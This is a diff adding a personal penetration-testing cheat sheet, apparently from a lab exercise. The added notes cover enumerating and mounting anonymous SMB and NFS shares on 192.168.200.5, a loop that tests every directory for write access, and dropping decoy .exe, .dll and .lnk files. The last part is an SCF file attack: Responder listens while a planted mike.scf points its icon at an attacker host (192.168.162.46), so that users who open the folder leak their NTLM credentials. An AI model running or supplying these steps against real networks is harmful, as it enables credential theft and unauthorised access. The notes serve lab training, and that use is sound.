@@ -96,3 +96,55 @@ su mount -t nfs 192.168.200.5/backups /tmp/bu
 cd /tmp/bu 
 find | tee ~/lab/nfslist.txt 
 find | grep -i config 
+
+
+===================================  
+Pull All Share Names
+smbclient -N -L \\\\192.168.200.5 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' 
+
+Check All Shares
+smbclient -N -L \\\\192.168.200.5 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' | while read share; do echo "======${share}======"; smbclient -N "//192.168.200.5/${share}" -c dir; echo; done 
+
+mkdir /mnt/ds 
+mount -t cifs "//192.168.200.5/department" /mnt/ds 
+tree -l 
+find /dir -type f -follow -print|xargs ls -l 
+
+===================================  
+Test for 'Write' in Files and Directories
+  
+cd /mnt/ds 
+find . -type d | while read directory; do  
+    touch ${directory}/mike 2>/dev/null && echo "${directory} - write file" && rm ${directory}/mike;  
+    mkdir ${directory}/mike 2>/dev/null && echo "${directory} - write dir" && rmdir ${directory}/mike;  
+done 
+
+===================================  
+Create Variety of Filetypes 
+
+touch {/mnt/ds/archive/,./}mike.{lnk,exe,dll,ini} 
+touch {/mnt/ds/Users/Public/,./}mike.{lnk,exe,dll,ini} 
+
+Some are Deleted 
+watch -d "ls /mnt/Users/Public/*; ls /mnt/archive/mike*" 
+
+
+===================================  
+Files being Accessed/Deleted 
+
+Maybe we can exploit .scf when a 'User' opens the folder 
+Windows Explorer Shell Command files (.scf)  
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ 
+sudo python3 Responder.py -I tun 0
+REF: ClientSideAttacks  
+
+cat test.txt
+put test.txt 
+vim mike.scf
+[Shell] 
+Command=2 
+IconFile=\\192.168.162.46\share\fav.ico
+[Taskbar] 
+Command=ToggleDesktop 
+
+
